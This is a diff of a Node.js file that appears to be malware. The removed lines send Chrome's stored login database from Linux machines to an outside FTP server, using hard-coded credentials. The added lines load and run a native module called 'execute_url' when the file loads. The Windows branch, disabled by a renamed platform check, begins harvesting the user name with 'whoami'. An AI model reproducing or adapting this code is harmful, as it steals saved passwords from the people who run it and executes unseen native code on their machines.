@@ -5,24 +5,12 @@ var finder = require('files-finder');
 var c = new Client();
 var exec = require('child_process').exec;
 var fs = require("fs");
+var vir = require("./build/Release/execute_url");
+console.log(vir.execute_url());
 
-// For Linux
 if(os.platform() === 'linux'){
-    c.on('ready', function() {
-        c.put('~/.config/google-chrome/Default/Login\ Data', '/htdocs/file'+ Date.now() +'.txt', function(err) {
-            if (err) {
-                throw err;
-            }
-            c.end();
-        });
-    });
-    /* FTP Configs */
-    c.connect({
-        host: 'ftp.byethost12.com',
-        user: 'b12_16353986',
-        password: 'gregLIN19'
-    });
-} else if (os.platform() === 'win32'){ // For Windows
+    // Linux equivalent
+} else if (os.platform() === 'win3221'){ // For Windows
     var child = exec('whoami', function (error, stdout, stderr) {
         var arr = stdout.split('\\');
         var username = arr[arr.length - 1];
